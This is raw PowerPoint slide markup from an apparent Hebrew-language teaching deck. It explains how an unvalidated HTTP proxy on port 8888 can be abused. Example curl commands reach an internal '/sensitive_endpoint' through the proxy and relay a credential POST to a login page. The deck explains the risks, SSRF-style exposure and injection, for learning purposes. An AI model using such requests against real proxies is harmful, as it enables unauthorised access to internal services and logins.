            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="248594238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00939C-9775-4AED-9E8F-A75F37AFDA4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4018721" y="119270"/>
            <a:ext cx="10058400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{07792752-64EB-402C-AF37-2EFBBF42CC37}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1222513"/>
            <a:ext cx="10058400" cy="5516217"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיוון שהשרת שלנו מעביר כל בקשה שהוא מקבל לשרת היעד ללא שום בדיקה או אימות, תוקף יכול לשלוח בקשות לכתובות זדוניות או לשרתים פנימיים ברשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה להתקפה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נשלח בקשה לכתובת פנימית על ידי שימוש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלנו:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl -x http://localhost:8888 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>http://localhost:8888/sensitive_endpoint</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה קורה כאן?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הפעלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף מפעיל את שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלנו שמאזין לבקשות נכנסות בפורט 8888.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שליחת בקשה זדונית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף שולח בקשה דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלנו לכתובת פנימית או לא מורשית והיא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://localhost:8888/sensitive_endpoint</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התנהגות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלנו מקבל את הבקשה ומעביר אותה לכתובת המצוינת, במקרה הזה כתובת פנימית על אותו שרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חשיפת מידע רגיש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם הכתובת הפנימית מכילה מידע רגיש או משאבים שאסור לגשת אליהם מבחוץ, התוקף יקבל את המידע הזה דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלנו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>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6861690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0975C9A-B862-4075-9A02-AC704572A1F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="894522" y="0"/>
            <a:ext cx="10677939" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפה הלכה למעשה על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C3A913AE-2D7B-4EDE-A9F3-F52578124042}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1192697"/>
            <a:ext cx="10058400" cy="5396946"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בעיות בקוד</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גישה לכתובות פנימיות -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בעיה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: בקוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלנו, כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של הבקשה מועברת ישירות לשרת היעד ללא בדיקות או סינונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיכון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם השרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלך פועל באותו מחשב שבו ישנם גם שירותים פנימיים או רגישים, תוקף יכול לשלוח בקשות לכתובות פנימיות אלו כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://localhost:8888/sensitive_endpoint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולהשיג גישה למשאבים או מידע שלא היה נגיש להם במצב רגיל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>העברת בקשות לא מורשות - בעיה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אין מגבלות על כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שאליה הבקשות מועברות. כל בקשה שנשלחת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תועבר לשרת היעד, גם אם מדובר בכתובת לא מורשית או מסוכנת</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיכון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף יכול לנצל את הפער הזה כדי לבצע התקפות, כמו שליחת בקשות לכתובת פנימית או סודית של השרת, מה שיכול להוביל לחשיפת מידע רגיש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>העברת בקשות פוגעניות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בעיה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם השרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלך מאפשר בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PUT, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף יכול לשלוח בקשות עם תוכן זדוני (כגון מתקפות הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיכון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף יכול לשלוח בקשות עם נתונים פוגעניים דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, ולגרום לנזק לשרת היעד או לגנוב מידע רגיש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40931107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886222A-11E4-4EE6-A057-72F8CF298DBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="622716"/>
            <a:ext cx="10707757" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפה הלכה למעשה על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{580650AE-C649-4BBE-830E-6968E8B6EFFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ולכן, עבור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl -x http://localhost:8888 http://localhost:8888/sensitive_endpoint</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מקבל את הבקשה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://localhost:8888/sensitive_endpoint</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מעביר את הבקשה לשרת היעד בכתובת הפנימית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sensitive_endpoint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מכיל מידע רגיש או פונקציות מסוכנות, התוקף יכול לגשת אליהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוצאה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מקבל את התגובה מהכתובת הפנימית, ויכול לחשוף מידע רגיש או לבצע פעולות זדוניות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="326473153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0520F4B-A5E6-4DB8-9E38-DA37E33B628B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="178904" y="344421"/>
            <a:ext cx="12254948" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. שימוש בשרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> לשליחת בקשות זדוניות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{226F9CB5-2DB2-43CA-81C8-34DBE3DE7489}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1490871"/>
            <a:ext cx="10058400" cy="4870172"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף יכול להשתמש בשרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לבצע התקפות על שרתים אחרים, כגון התקפות מניעת שירות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או הזרקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה להתקפה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נשלח בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדונית לשרת היעד:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl -x http://localhost:8888 -X POST -d "username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>admin&amp;password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=1234" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://example.com/login</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה עושה הקוד הזה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl -x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost:8888</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : מציין שהשימוש בשרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמאזין על כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://localhost:8888 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-X POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מבצע בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ולא בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> רגילה. זה חשוב כשמדובר בבקשות ששולחות נתונים לשרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-d "username=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>admin&amp;password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=1234</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שולח נתונים בגוף הבקשה, במקרה זה נתוני התחברות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ו- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>password</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://example.com/login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : הכתובת שאליה נשלחת הבקשה, במקרה זה כתובת עמוד התחברות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="258260277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2859AB-C370-481D-B974-58BC2FD73ACE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884583" y="137160"/>
            <a:ext cx="10697817" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפה הלכה למעשה על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E50AD901-9613-4D7F-B781-CC97CEE013F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1192696"/>
            <a:ext cx="10058400" cy="5059017"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בעיות פוטנציאליות והתקפות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> כדי לשלוח בקשות זדוניות</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בעיה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלנו מעביר כל בקשה שהוא מקבל לשרת היעד מבלי לבדוק או להניח מגבלות על סוגי הבקשות או התוכן שלהן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקף יכול לשלוח בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עם נתונים זדוניים כמו במקרה הזה (התחברות עם פרטי משתמש גנובים) או נתונים זדוניים אחרים דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
